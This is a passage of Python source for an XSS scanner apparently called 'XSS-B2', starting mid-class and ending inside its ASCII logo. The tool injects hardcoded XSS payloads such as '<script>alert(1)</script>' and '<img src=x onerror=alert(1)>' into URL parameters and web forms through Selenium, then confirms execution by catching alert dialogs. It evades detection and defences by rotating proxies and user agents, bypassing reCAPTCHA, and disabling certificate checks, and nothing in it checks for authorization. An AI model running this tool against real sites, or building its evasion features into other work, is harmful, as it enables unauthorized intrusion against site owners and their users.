    def parse_arjun_stdout(self, stdout_text):
        """Extract parameters from Arjun console output"""
        params = []
        patterns = [
            r"Extracted \d+ parameters .*?: (.+)",
            r"Found parameters?: (.+)",
            r"Parameters: (.+)"
        ]
        
        for pattern in patterns:
            match = re.search(pattern, stdout_text, re.IGNORECASE)
            if match:
                param_list = [p.strip() for p in match.group(1).split(",")]
                params.extend(param_list)
                
        return [p for p in params if p and len(p) > 1]
    
    def load_payloads(self):
        """Load XSS payloads from file or use defaults"""
        if hasattr(self.args, 'payloads') and self.args.payloads and os.path.exists(self.args.payloads):
            try:
                with open(self.args.payloads, "r", encoding="utf-8") as f:
                    payloads = [line.strip() for line in f if line.strip()]
                self.logger.info(f"Loaded {len(payloads)} custom payloads")
                return payloads
            except Exception as e:
                self.logger.error(f"Error loading payloads file: {str(e)}")
        self.logger.info(f"Using {len(DEFAULT_PAYLOADS)} default payloads")
        return DEFAULT_PAYLOADS
    
    def load_targets(self):
        """Load target URLs from arguments"""
        targets = []
        
        if hasattr(self.args, 'url') and self.args.url:
            targets.append(self.args.url.strip())
        elif hasattr(self.args, 'list') and self.args.list:
            try:
                with open(self.args.list, "r", encoding="utf-8") as f:
                    targets = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                self.logger.error(f"Target file not found: {self.args.list}")
                sys.exit(1)
        else:
            self.logger.error("Please specify either -u or -l")
            sys.exit(1)
            
        # Validate URLs
        valid_targets = []
        for target in targets:
            if self.validate_url(target):
                valid_targets.append(target)
                
        self.logger.info(f"Loaded {len(valid_targets)} valid target(s)")
        return valid_targets
    
    @contextmanager
    def setup_browser(self):
        """Setup browser with proper cleanup, proxy support and user agent rotation"""
        chrome_options = Options()
        
        # Get user agent for this browser session
        user_agent = self.user_agent_manager.get_next_agent()
        chrome_options.add_argument(f"--user-agent={user_agent}")
        
        # Basic options for Kali Linux compatibility
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-extensions")
        chrome_options.add_argument("--disable-plugins")
        chrome_options.add_argument("--disable-images")
        chrome_options.add_argument("--disable-web-security")
        chrome_options.add_argument("--ignore-certificate-errors")
        chrome_options.add_argument("--ignore-ssl-errors")
        chrome_options.add_argument("--disable-proxy-certificate-handler")
        chrome_options.add_argument("--disable-background-timer-throttling")
        chrome_options.add_argument("--remote-debugging-port=0")  # Random port
        
        # Additional Kali Linux specific options
        chrome_options.add_argument("--disable-features=VizDisplayCompositor")
        chrome_options.add_argument("--disable-ipc-flooding-protection")
        
        # Proxy configuration - use first working proxy for browser session
        if self.proxy_manager.has_working_proxies():
            proxy_address = self.proxy_manager.get_proxy_for_selenium()
            if proxy_address:
                chrome_options.add_argument(f"--proxy-server={proxy_address}")
                self.logger.proxy_info(f"Browser configured with proxy: {proxy_address}")
        else:
            self.logger.info("No working proxies available - using direct connection")
        
        # Log user agent info
        agent_info = self.user_agent_manager.get_current_agent_info()
        self.logger.info(f"Browser configured with User Agent: {agent_info}")
        
        show_browser = getattr(self.args, 'show_browser', False)
        if not show_browser:
            chrome_options.add_argument("--headless=new")
            self.logger.info("Running browser in headless mode (use --show-browser to see browser)")
        else:
            self.logger.info("Running browser in visible mode")
        
        driver = None
        try:
            # Setup Chrome service with proper driver path
            if self.chromedriver_path:
                service = Service(self.chromedriver_path)
                driver = webdriver.Chrome(service=service, options=chrome_options)
            else:
                # Try without explicit path (use system PATH)
                driver = webdriver.Chrome(options=chrome_options)
            
            timeout = getattr(self.args, 'timeout', 10)
            driver.set_page_load_timeout(timeout)
            driver.implicitly_wait(5)
            
            self.driver = driver
            yield driver
            
        except WebDriverException as e:
            self.logger.error(f"ChromeDriver error: {str(e)}")
            self.logger.error("Please ensure Chrome/Chromium and ChromeDriver are properly installed")
            self.logger.info("Try running: sudo apt update && sudo apt install chromium")
            self.logger.info("Or install dependencies: pip install webdriver-manager")
            sys.exit(1)
        except Exception as e:
            self.logger.error(f"Browser setup error: {str(e)}")
            sys.exit(1)
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
    
    def get_page_with_proxy(self, url):
        """Get page content using requests with improved proxy handling and user agent rotation"""
        max_attempts = 3
        
        for attempt in range(max_attempts):
            try:
                # Get next user agent for this request
                user_agent = self.user_agent_manager.get_next_agent()
                
                session = requests.Session()
                session.headers.update({
                    'User-Agent': user_agent
                })
                
                # Use proxy if available
                proxies = self.proxy_manager.get_proxy_for_requests()
                connection_type = "Direct"
                
                if proxies:
                    session.proxies.update(proxies)
                    connection_type = f"Proxy: {self.proxy_manager.get_current_proxy_info()}"
                
                agent_info = self.user_agent_manager.get_current_agent_info()
                self.logger.debug(f"Fetching page via {connection_type} with {agent_info} (attempt {attempt + 1})")
                
                response = session.get(url, timeout=10, verify=False)
                response.raise_for_status()
                
                self.logger.debug(f"✓ Page fetched successfully via {connection_type} with {agent_info}")
                return response
                
            except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, 
                    requests.exceptions.ConnectionError) as proxy_error:
                
                if self.proxy_manager.current_proxy:
                    self.logger.warning(f"Proxy failed, trying next proxy: {str(proxy_error)}")
                    self.proxy_manager.mark_proxy_failed(self.proxy_manager.current_proxy)
                    
                    if not self.proxy_manager.has_working_proxies():
                        self.logger.warning("No more working proxies available")
                        if attempt == max_attempts - 1:
                            raise proxy_error
                else:
                    # Direct connection failed
                    if attempt == max_attempts - 1:
                        raise proxy_error
                        
            except requests.exceptions.RequestException as e:
                if attempt == max_attempts - 1:
                    raise e
                self.logger.warning(f"Request failed (attempt {attempt + 1}), retrying...")
                time.sleep(1)
                
        raise requests.exceptions.RequestException(f"Failed to fetch page after {max_attempts} attempts")
    
    def check_for_alerts(self, driver):
        """Enhanced alert detection - ONLY TRUE POSITIVES (no duplicate messages)"""
        try:
            # Multiple attempts to catch different types of popups
            for attempt in range(5):
                try:
                    # Wait for alert with timeout
                    WebDriverWait(driver, 3).until(EC.alert_is_present())
                    alert = driver.switch_to.alert
                    alert_text = alert.text
                    
                    # Accept the alert
                    alert.accept()
                    
                    return {
                        'detection_type': 'alert_execution',
                        'alert_text': alert_text,
                        'proxy_used': self.proxy_manager.get_current_proxy_info() if self.proxy_manager.current_proxy else None,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                except TimeoutException:
                    if attempt == 0:
                        # Try interacting with the page to trigger events
                        try:
                            driver.execute_script("document.body.click();")
                            time.sleep(0.5)
                        except:
                            pass
                    break
                except NoAlertPresentException:
                    time.sleep(0.5)
                    continue
                except UnexpectedAlertPresentException:
                    try:
                        alert = driver.switch_to.alert
                        alert_text = alert.text
                        alert.accept()
                        
                        return {
                            'detection_type': 'unexpected_alert',
                            'alert_text': alert_text,
                            'proxy_used': self.proxy_manager.get_current_proxy_info() if self.proxy_manager.current_proxy else None,
                            'timestamp': datetime.now().isoformat()
                        }
                    except:
                        pass
                        
        except Exception as e:
            self.logger.debug(f"Error in alert detection: {str(e)}")
            
        return None
    
    def check_executable_xss(self, driver, payload):
        """Check for actual executable XSS - DOM manipulation detection (no duplicate messages)"""
        try:
            # Check if there's actual JavaScript execution by looking for DOM changes
            # that would indicate XSS execution
            
            # Try to execute a test script to see if we have JavaScript execution context
            try:
                # Check if we can execute JavaScript and if our payload is in an executable context
                result = driver.execute_script("""
                    // Look for our XSS payload in executable contexts
                    var payload = arguments[0];
                    var dangerous = false;
                    
                    // Check if payload appears in script tags content
                    var scripts = document.getElementsByTagName('script');
                    for(var i = 0; i < scripts.length; i++) {
                        if(scripts[i].innerHTML.indexOf(payload) !== -1) {
                            dangerous = true;
                            break;
                        }
                    }
                    
                    // Check if payload appears in event handlers
                    var elements = document.getElementsByTagName('*');
                    for(var i = 0; i < elements.length; i++) {
                        var attrs = elements[i].attributes;
                        for(var j = 0; j < attrs.length; j++) {
                            if(attrs[j].name.indexOf('on') === 0 && attrs[j].value.indexOf(payload) !== -1) {
                                dangerous = true;
                                break;
                            }
                        }
                        if(dangerous) break;
                    }
                    
                    return dangerous;
                """, payload)
                
                if result:
                    return {
                        'detection_type': 'executable_context',
                        'payload': payload,
                        'proxy_used': self.proxy_manager.get_current_proxy_info() if self.proxy_manager.current_proxy else None,
                        'timestamp': datetime.now().isoformat()
                    }
                    
            except Exception as e:
                self.logger.debug(f"Error checking executable context: {str(e)}")
                    
        except Exception as e:
            self.logger.debug(f"Error checking executable XSS: {str(e)}")
            
        return None
    
    def test_xss_payload_get(self, driver, url, payload_num, payload):
        """Test a single XSS payload using GET method - ONLY REAL VULNERABILITIES"""
        try:
            # Show proxy and user agent info for this test
            if self.proxy_manager.has_working_proxies():
                self.logger.proxy_info(f"Testing payload via proxy: {self.proxy_manager.get_current_proxy_info()}")
            
            agent_info = self.user_agent_manager.get_current_agent_info()
            self.logger.debug(f"Using User Agent: {agent_info}")
            self.logger.debug(f"Testing GET payload {payload_num}: {payload}")
            
            # Navigate to the URL
            driver.get(url)
            
            # Check for reCAPTCHA if bypass enabled
            if self.bypass_recaptcha:
                try:
                    recaptcha_solver = RecaptchaSolver(driver, self.logger)
                    if recaptcha_solver.solve_captcha():
                        self.logger.success("Successfully bypassed reCAPTCHA")
                except Exception as e:
                    self.logger.warning(f"reCAPTCHA bypass failed: {str(e)}")
            
            # Wait for page load
            time.sleep(2)
            
            # Check for immediate alerts (REAL XSS)
            alert_detected = self.check_for_alerts(driver)
            if alert_detected:
                self.logger.success(f"🚨 REAL XSS VULNERABILITY CONFIRMED!")
                self.logger.success(f"Method: GET")
                self.logger.success(f"URL: {url}")
                self.logger.success(f"Payload: {payload}")
                self.logger.success(f"Alert executed with text: {alert_detected.get('alert_text', 'N/A')}")
                self.logger.success(f"User Agent: {agent_info}")
                if self.proxy_manager.current_proxy:
                    self.logger.success(f"Via Proxy: {self.proxy_manager.get_current_proxy_info()}")
                
                # Combine alert detection result with other info
                result = {
                    'url': url,
                    'method': 'GET',
                    'payload': payload,
                    'user_agent': agent_info,
                    'timestamp': datetime.now().isoformat(),
                    'payload_number': payload_num
                }
                result.update(alert_detected)
                return result
            
            # Check for executable XSS in DOM
            executable_result = self.check_executable_xss(driver, payload)
            if executable_result:
                self.logger.success(f"🚨 EXECUTABLE XSS DETECTED!")
                self.logger.success(f"Method: GET (Executable)")
                self.logger.success(f"URL: {url}")
                self.logger.success(f"Payload: {payload}")
                self.logger.success(f"Payload found in executable context")
                self.logger.success(f"User Agent: {agent_info}")
                if self.proxy_manager.current_proxy:
                    self.logger.success(f"Via Proxy: {self.proxy_manager.get_current_proxy_info()}")
                
                result = {
                    'url': url,
                    'method': 'GET',
                    'payload': payload,
                    'user_agent': agent_info,
                    'timestamp': datetime.now().isoformat(),
                    'payload_number': payload_num
                }
                result.update(executable_result)
                return result
            
            # Try to trigger any delayed JavaScript execution
            try:
                driver.execute_script("document.body.click();")
                time.sleep(1)
                
                # Check again for alerts after interaction
                alert_detected = self.check_for_alerts(driver)
                if alert_detected:
                    self.logger.success(f"🚨 DELAYED XSS VULNERABILITY CONFIRMED!")
                    self.logger.success(f"Method: GET (Delayed)")
                    self.logger.success(f"URL: {url}")
                    self.logger.success(f"Payload: {payload}")
                    self.logger.success(f"Alert executed with text: {alert_detected.get('alert_text', 'N/A')}")
                    self.logger.success(f"User Agent: {agent_info}")
                    if self.proxy_manager.current_proxy:
                        self.logger.success(f"Via Proxy: {self.proxy_manager.get_current_proxy_info()}")
                    
                    result = {
                        'url': url,
                        'method': 'GET',
                        'payload': payload,
                        'user_agent': agent_info,
                        'timestamp': datetime.now().isoformat(),
                        'payload_number': payload_num
                    }
                    result.update(alert_detected)
                    return result
                    
            except Exception as e:
                self.logger.debug(f"Error triggering delayed execution: {str(e)}")
            
            # NO FALSE POSITIVES - only return if we have actual JavaScript execution
            return None
            
        except Exception as e:
            self.logger.debug(f"Error testing {url}: {str(e)}")
            return None
    
    def test_xss_get(self, driver, target, params, result_file):
        payloads = self.load_payloads()
        effective_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "';alert(1);//",
            '";alert(1);//',
            '"><script>alert(1)</script>'
        ]
        sorted_payloads = effective_payloads + [p for p in payloads if p not in effective_payloads]
        vulnerabilities = []
        vulnerable_params = set()
        
        with open(result_file, "w", encoding="utf-8") as rf:
            rf.write(f"REAL XSS Testing Results for {target}\n")
            rf.write(f"Timestamp: {datetime.now().isoformat()}\n")
            rf.write(f"Method: GET\n")
            rf.write(f"Parameters tested: {', '.join(params)}\n")
            rf.write(f"Note: ONLY REAL VULNERABILITIES (with actual JavaScript execution)\n")
            if self.proxy_manager.proxies:
                rf.write(f"Proxies loaded: {len(self.proxy_manager.proxies)}\n")
                rf.write(f"Working proxies: {len(self.proxy_manager.working_proxies)}\n")
            if self.bypass_recaptcha:
                rf.write(f"reCAPTCHA bypass: Enabled\n")
            rf.write("="*80 + "\n\n")
            
            total_possible_tests = len(params) * len(sorted_payloads)
            test_count = 0
            
            # Setup progress bar if enabled
            if self.use_terminal_bar:
                progress = Progress(
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(),
                    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                    TimeRemainingColumn(),
                    transient=True
                )
                task = progress.add_task("[cyan]Testing parameters...", total=total_possible_tests)
                progress.start()
            else:
                progress = None
                task = None
            
            try:
                for param in params:
                    self.logger.info(f"Testing parameter: {param} using GET method")
                    param_vulnerable = False
                    for payload_num, payload in enumerate(sorted_payloads, 1):
                        test_count += 1
                        self.total_tests += 1
                        
                        if progress and task:
                            progress.update(task, advance=1, description=f"[cyan]Testing {param[:15]}...")
                        
                        # --- Enforce proxy rotation for every request ---
                        proxies = self.proxy_manager.get_proxy_for_requests()  # This rotates the proxy
                        # Test with different encoding strategies
                        encoded_payloads = [
                            quote(payload, safe=''),  # Standard URL encoding
                            quote(payload, safe='<>'),  # Partial encoding
                            payload,  # No encoding
                        ]
                        for encoding_type, encoded_payload in enumerate(encoded_payloads):
                            if encoding_type > 0 and param_vulnerable:
                                break  # Skip additional encodings if already found vulnerable
                            test_url = f"{target}?{param}={encoded_payload}"
                            encoding_desc = ["URL-encoded", "Partially-encoded", "Raw"][encoding_type]
                            self.logger.debug(f"({test_count}) Testing: {param} with payload {payload_num} ({encoding_desc}) via proxy: {self.proxy_manager.get_current_proxy_info()}")
                            result = self.test_xss_payload_get(driver, test_url, payload_num, payload)
                            if result:
                                self.vulnerabilities_found += 1
                                vulnerabilities.append(result)
                                vulnerable_params.add(param)
                                param_vulnerable = True
                                rf.write(f"🚨 REAL XSS VULNERABILITY CONFIRMED!\n")
                                rf.write(f"Method: GET\n")
                                rf.write(f"Parameter: {param}\n")
                                rf.write(f"URL: {test_url}\n")
                                rf.write(f"Payload: {payload}\n")
                                rf.write(f"Encoding: {encoding_desc}\n")
                                rf.write(f"Detection Type: {result.get('detection_type', 'alert')}\n")
                                if result.get('alert_text'):
                                    rf.write(f"Alert Text: {result['alert_text']}\n")
                                rf.write(f"User Agent: {result.get('user_agent', 'Unknown')}\n")
                                if result.get('proxy_used'):
                                    rf.write(f"Proxy Used: {result['proxy_used']}\n")
                                rf.write(f"Timestamp: {result['timestamp']}\n")
                                rf.write("-"*50 + "\n\n")
                                rf.flush()
                                self.logger.success(f"Parameter '{param}' confirmed vulnerable - moving to next parameter")
                                break  # Stop testing more encodings for this payload
                            time.sleep(1)  # Sleep 1 second between each request to avoid rapid-fire issues
                        if param_vulnerable:
                            break  # Stop testing more payloads for this parameter
                        delay = getattr(self.args, 'delay', 1)
                        # Already sleeping above, so can skip or keep for user-configurable extra delay
                    if not param_vulnerable:
                        self.logger.info(f"Parameter '{param}' tested with {len(sorted_payloads)} payloads - NO REAL XSS FOUND")
            finally:
                if progress:
                    progress.stop()
            
            rf.write(f"\nSUMMARY:\n")
            rf.write(f"Method used: GET\n")
            rf.write(f"REAL vulnerabilities found: {len(vulnerabilities)}\n")
            rf.write(f"Vulnerable parameters: {len(vulnerable_params)}\n")
            rf.write(f"Total tests performed: {self.total_tests}\n")
            rf.write(f"Tests saved by early detection: {total_possible_tests - self.total_tests}\n")
            if self.proxy_manager.proxies:
                rf.write(f"Total proxies used: {len(self.proxy_manager.proxies)}\n")
                rf.write(f"Working proxies: {len(self.proxy_manager.working_proxies)}\n")
                rf.write(f"Failed proxies: {len(self.proxy_manager.failed_proxies)}\n")
            if self.bypass_recaptcha:
                rf.write(f"reCAPTCHA bypass: Enabled\n")
            if len(params) > 0:
                rf.write(f"Vulnerable parameters rate: {len(vulnerable_params)/len(params)*100:.2f}%\n")
        return vulnerabilities
    
    def submit_form_and_check(self, driver, url, form, input_name, payload):
        """Submit form with payload and check for REAL XSS execution (no duplicate messages)"""
        inputs = form.find_all(['input', 'textarea', 'select'])
        data = {}
        
        for input_field in inputs:
            name = input_field.get('name')
            if name:
                if name == input_name:
                    data[name] = payload
                else:
                    # Fill other fields with default values
                    if input_field.get('type') == 'hidden':
                        data[name] = input_field.get('value', '')
                    else:
                        data[name] = 'testdata'
        
        action = form.get('action', '')
        if action and not action.startswith(('http://', 'https://')):
            action = urljoin(url, action)
        else:
            action = url
        
        try:
            # Show proxy and user agent info for this test
            if self.proxy_manager.has_working_proxies():
                self.logger.proxy_info(f"Testing form via proxy: {self.proxy_manager.get_current_proxy_info()}")
            
            agent_info = self.user_agent_manager.get_current_agent_info()
            self.logger.debug(f"Using User Agent: {agent_info}")
            
            driver.get(url)
            time.sleep(1)
            
            # Check for reCAPTCHA if bypass enabled
            if self.bypass_recaptcha:
                try:
                    recaptcha_solver = RecaptchaSolver(driver, self.logger)
                    if recaptcha_solver.solve_captcha():
                        self.logger.success("Successfully bypassed reCAPTCHA")
                except Exception as e:
                    self.logger.warning(f"reCAPTCHA bypass failed: {str(e)}")
            
            # Fill form fields
            for name, value in data.items():
                try:
                    input_field = driver.find_element(By.NAME, name)
                    input_field.clear()
                    input_field.send_keys(value)
                except Exception as e:
                    self.logger.debug(f"Could not find or interact with field: {name}")
            
            # Submit form
            submitted = False
            try:
                submit_button = driver.find_element(By.XPATH, "//input[@type='submit']")
                submit_button.click()
                submitted = True
            except:
                try:
                    submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
                    submit_button.click()
                    submitted = True
                except:
                    try:
                        submit_button = driver.find_element(By.XPATH, "//button[contains(text(),'Submit') or contains(text(),'Send') or contains(text(),'Go')]")
                        submit_button.click()
                        submitted = True
                    except:
                        self.logger.debug("Could not find submit button, attempting to submit form directly")
                        try:
                            driver.execute_script("document.forms[0].submit();")
                            submitted = True
                        except Exception as e:
                            self.logger.debug(f"Could not submit form: {str(e)}")
                            return False, None, None
            
            if not submitted:
                return False, None, None
            
            # Wait for page response
            time.sleep(2)
            
            # Check for alerts - REAL XSS
            alert_result = self.check_for_alerts(driver)
            if alert_result:
                return True, payload, action
            
            # Check for executable XSS
            executable_result = self.check_executable_xss(driver, payload)
            if executable_result:
                return True, payload, action
            
            # Try interaction to trigger delayed execution
            try:
                driver.execute_script("document.body.click();")
                time.sleep(1)
                
                alert_result = self.check_for_alerts(driver)
                if alert_result:
                    return True, payload, action
            except:
                pass
            
            return False, None, None
                
        except Exception as e:
            self.logger.debug(f"Error in form submission: {str(e)}")
            return False, None, None
    
    def check_post_xss_vulnerability(self, driver, url):
        try:
            response = self.get_page_with_proxy(url)
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Failed to fetch the page {url}. Error: {e}")
            return []
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')
        if not forms:
            self.logger.warning(f"No forms found on the webpage: {url}")
            return []
        self.logger.info(f"Found {len(forms)} form(s) on the page")
        payloads = self.load_payloads()
        vulnerabilities = []
        
        # Setup progress bar if enabled
        if self.use_terminal_bar:
            progress = Progress(
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeRemainingColumn(),
                transient=True
            )
            total_tests = len(forms) * sum(len(form.find_all(['input', 'textarea', 'select'])) for form in forms) * len(payloads)
            task = progress.add_task("[cyan]Testing form inputs...", total=total_tests)
            progress.start()
        else:
            progress = None
            task = None
        
        try:
            for form_index, form in enumerate(forms, 1):
                self.logger.debug(f"Analyzing form {form_index}")
                inputs = form.find_all(['input', 'textarea', 'select'])
                for input_field in inputs:
                    input_name = input_field.get('name')
                    input_type = input_field.get('type', 'text')
                    if input_name and input_type not in ['submit', 'button', 'reset', 'file']:
                        self.logger.info(f"Testing form {form_index} input: {input_name} (type: {input_type})")
                        for payload_num, payload in enumerate(payloads, 1):
                            self.total_tests += 1
                            
                            if progress and task:
                                progress.update(task, advance=1, description=f"[cyan]Testing {input_name[:15]}...")
                            
                            # --- Enforce proxy rotation for every request ---
                            proxies = self.proxy_manager.get_proxy_for_requests()  # This rotates the proxy
                            self.logger.debug(f"Testing input '{input_name}' with payload {payload_num}: {payload} via proxy: {self.proxy_manager.get_current_proxy_info()}")
                            is_vulnerable, effective_payload, vulnerable_url = self.submit_form_and_check(
                                driver, url, form, input_name, payload
                            )
                            if is_vulnerable:
                                self.vulnerabilities_found += 1
                                agent_info = self.user_agent_manager.get_current_agent_info()
                                self.logger.success(f"🚨 REAL XSS VULNERABILITY CONFIRMED!")
                                self.logger.success(f"Method: POST (Form Submission)")
                                self.logger.success(f"URL: {url}")
                                self.logger.success(f"Form: {form_index}")
                                self.logger.success(f"Input: {input_name} (type: {input_type})")
                                self.logger.success(f"Vulnerable URL: {vulnerable_url}")
                                self.logger.success(f"Payload: {effective_payload}")
                                self.logger.success(f"User Agent: {agent_info}")
                                if self.proxy_manager.current_proxy:
                                    self.logger.success(f"Via Proxy: {self.proxy_manager.get_current_proxy_info()}")
                                vulnerability_data = {
                                    'url': url,
                                    'vulnerable_url': vulnerable_url,
                                    'method': 'POST',
                                    'form_index': form_index,
                                    'input_name': input_name,
                                    'input_type': input_type,
                                    'form_method': form.get('method', 'get').upper(),
                                    'payload': effective_payload,
                                    'user_agent': agent_info,
                                    'proxy_used': self.proxy_manager.get_current_proxy_info() if self.proxy_manager.current_proxy else None,
                                    'timestamp': datetime.now().isoformat()
                                }
                                vulnerabilities.append(vulnerability_data)
                                self.logger.success(f"Input '{input_name}' confirmed vulnerable - moving to next input")
                                break
                            time.sleep(1)  # Sleep 1 second between each request to avoid rapid-fire issues
                        else:
                            self.logger.info(f"Input '{input_name}' tested with {len(payloads)} payloads - NO REAL XSS FOUND")
        finally:
            if progress:
                progress.stop()
        
        return vulnerabilities
    
    def test_post_xss(self, driver, target, result_file):
        """Test XSS vulnerabilities using POST method with form testing - NO FALSE POSITIVES"""
        vulnerabilities = self.check_post_xss_vulnerability(driver, target)
        
        with open(result_file, "w", encoding="utf-8") as rf:
            rf.write(f"REAL XSS Testing Results for {target}\n")
            rf.write(f"Timestamp: {datetime.now().isoformat()}\n")
            rf.write(f"Method: POST (Form Submission)\n")
            rf.write(f"Note: ONLY REAL VULNERABILITIES (with actual JavaScript execution)\n")
            if self.proxy_manager.proxies:
                rf.write(f"Proxies loaded: {len(self.proxy_manager.proxies)}\n")
                rf.write(f"Working proxies: {len(self.proxy_manager.working_proxies)}\n")
            if self.bypass_recaptcha:
                rf.write(f"reCAPTCHA bypass: Enabled\n")
            rf.write("="*80 + "\n\n")
            
            for vuln in vulnerabilities:
                rf.write(f"🚨 REAL XSS VULNERABILITY CONFIRMED!\n")
                rf.write(f"Method: POST (Form Submission)\n")
                rf.write(f"Form: {vuln.get('form_index', 'Unknown')}\n")
                rf.write(f"Input: {vuln['input_name']} (type: {vuln['input_type']})\n")
                rf.write(f"Form Method: {vuln.get('form_method', 'Unknown')}\n")
                rf.write(f"Original URL: {vuln['url']}\n")
                rf.write(f"Vulnerable URL: {vuln['vulnerable_url']}\n")
                rf.write(f"Payload: {vuln['payload']}\n")
                rf.write(f"User Agent: {vuln.get('user_agent', 'Unknown')}\n")
                if vuln.get('proxy_used'):
                    rf.write(f"Proxy Used: {vuln['proxy_used']}\n")
                rf.write(f"Timestamp: {vuln['timestamp']}\n")
                rf.write("-"*50 + "\n\n")
            
            # Write summary
            unique_inputs = len(set(vuln['input_name'] for vuln in vulnerabilities))
            rf.write(f"\nSUMMARY:\n")
            rf.write(f"Method used: POST (Form Submission)\n")
            rf.write(f"REAL vulnerabilities found: {len(vulnerabilities)}\n")
            rf.write(f"Vulnerable inputs: {unique_inputs}\n")
            rf.write(f"Total tests performed: {self.total_tests}\n")
            if self.proxy_manager.proxies:
                rf.write(f"Total proxies used: {len(self.proxy_manager.proxies)}\n")
                rf.write(f"Working proxies: {len(self.proxy_manager.working_proxies)}\n")
                rf.write(f"Failed proxies: {len(self.proxy_manager.failed_proxies)}\n")
            if self.bypass_recaptcha:
                rf.write(f"reCAPTCHA bypass: Enabled\n")
            
        return vulnerabilities
    
    def generate_json_report(self, all_results, output_dir):
        """Generate JSON report with all findings"""
        report = {
            'scan_info': {
                'timestamp': datetime.now().isoformat(),
                'total_vulnerabilities': self.vulnerabilities_found,
                'total_tests': self.total_tests,
                'tool_version': '2.3',
                'detection_method': 'Real JavaScript Execution Only',
                'user_agent_stats': {
                    'total_agents': len(self.user_agent_manager.user_agents),
                    'rotation_enabled': True,
                    'agents_used': self.user_agent_manager.user_agents
                },
                'proxy_stats': {
                    'total_proxies_loaded': len(self.proxy_manager.proxies) if self.proxy_manager.proxies else 0,
                    'working_proxies': len(self.proxy_manager.working_proxies) if hasattr(self.proxy_manager, 'working_proxies') else 0,
                    'failed_proxies': len(self.proxy_manager.failed_proxies),
                    'proxy_enabled': bool(self.proxy_manager.proxies),
                    'proxy_success_rate': (len(self.proxy_manager.working_proxies) / len(self.proxy_manager.proxies) * 100) if self.proxy_manager.proxies else 0
                },
                'recaptcha_bypass': self.bypass_recaptcha,
                'arguments': vars(self.args)
            },
            'vulnerabilities': all_results
        }
        
        json_file = os.path.join(output_dir, "real_xss_scan_report.json")
        try:
            with open(json_file, "w", encoding="utf-8") as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            self.logger.info(f"JSON report saved to: {json_file}")
        except Exception as e:
            self.logger.error(f"Failed to save JSON report: {str(e)}")
    
    def print_summary(self, all_results):
        """Print scan summary"""
        print("\n" + "="*80)
        print(f"{BOLD}{CYAN}REAL XSS SCAN SUMMARY - NO FALSE POSITIVES{RESET}")
        print("="*80)
        print(f"{BOLD}{GREEN}[+]{RESET} REAL Vulnerabilities Found: {self.vulnerabilities_found}")
        print(f"{BOLD}{BLUE}[+]{RESET} Total Tests Performed: {self.total_tests}")
        print(f"{BOLD}{YELLOW}[+]{RESET} Detection Method: JavaScript Execution Only")
        
        # User agent statistics
        print(f"{BOLD}{CYAN}[+]{RESET} User Agent Rotation: {len(self.user_agent_manager.user_agents)} agents")
        print(f"{BOLD}{CYAN}[+]{RESET} User Agents Used: Chrome, Firefox, Safari, Edge (Windows/macOS/Linux/Mobile)")
        
        # Proxy statistics
        if self.proxy_manager.proxies:
            print(f"{BOLD}{MAGENTA}[+]{RESET} Total Proxies Loaded: {len(self.proxy_manager.proxies)}")
            print(f"{BOLD}{MAGENTA}[+]{RESET} Working Proxies: {len(self.proxy_manager.working_proxies)}")
            print(f"{BOLD}{MAGENTA}[+]{RESET} Failed Proxies: {len(self.proxy_manager.failed_proxies)}")
            
            if len(self.proxy_manager.proxies) > 0:
                success_rate = (len(self.proxy_manager.working_proxies) / len(self.proxy_manager.proxies)) * 100
                print(f"{BOLD}{MAGENTA}[+]{RESET} Proxy Success Rate: {success_rate:.1f}%")
        else:
            print(f"{BOLD}{BLUE}[+]{RESET} Connection Method: Direct (No Proxies)")
        
        # reCAPTCHA bypass status
        if self.bypass_recaptcha:
            print(f"{BOLD}{GREEN}[+]{RESET} reCAPTCHA Bypass: Enabled")
        else:
            print(f"{BOLD}{YELLOW}[+]{RESET} reCAPTCHA Bypass: Disabled")
        
        # Calculate vulnerable parameters/inputs
        vulnerable_targets = set()
        method_used = getattr(self.args, 'method', 'GET').upper()
        
        if all_results:
            for result in all_results:
                if method_used == "GET":
                    # Extract parameter name from URL for GET
                    url_parts = result['url'].split('?')
                    if len(url_parts) > 1:
                        param_part = url_parts[1].split('=')[0]
                        vulnerable_targets.add(param_part)
                else:
                    # For POST, use input name
                    vulnerable_targets.add(result.get('input_name', 'unknown'))
        
        target_type = "Parameters" if method_used == "GET" else "Form Inputs"
        print(f"{BOLD}{GREEN}[+]{RESET} Vulnerable {target_type}: {len(vulnerable_targets)}")
        print(f"{BOLD}{YELLOW}[+]{RESET} Method Used: {method_used}")
        
        if self.total_tests > 0:
            vuln_rate = (self.vulnerabilities_found / self.total_tests) * 100
            print(f"{BOLD}{YELLOW}[+]{RESET} REAL Vulnerability Detection Rate: {vuln_rate:.2f}%")
            
        if all_results:
            print(f"\n{BOLD}Vulnerable URLs (CONFIRMED REAL XSS):{RESET}")
            unique_urls = set()
            for result in all_results:
                if method_used == "GET":
                    base_url = result['url'].split('?')[0]
                else:
                    base_url = result.get('url', result.get('vulnerable_url', 'Unknown'))
                unique_urls.add(base_url)
            
            for url in sorted(unique_urls):
                print(f"  {RED}🚨 {url}{RESET}")
        else:
            print(f"\n{BOLD}{GREEN}✓ No real XSS vulnerabilities found - all tests passed!{RESET}")
                
        print("="*80)
    
    def print_logo(self):
        """Print XSS-B2 logo with colors"""
        logo = f"""
{BOLD}{GREEN}ooooo  oooo  oooooooo8  oooooooo8          oooooooooo    ooooooo   
{BOLD}{GREEN}  888  88   888        888                  888    888 o88     888 
{BOLD}{GREEN}    888      888oooooo  888oooooo ooooooooo 888oooo88        o888  
{BOLD}{GREEN}   88 888           888        888          888    888    o888   o 
